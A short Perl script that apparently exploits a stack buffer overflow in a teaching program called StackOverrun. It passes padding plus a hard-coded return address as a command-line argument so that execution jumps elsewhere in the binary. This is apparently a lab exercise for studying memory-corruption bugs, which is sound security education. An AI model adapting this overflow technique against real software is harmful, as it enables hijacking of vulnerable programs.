$arg = "ABCDEFGHIJKLMNOP"."\x90\x11\x40";
$cmd = "out/StackOverrun ".$arg;

system($cmd);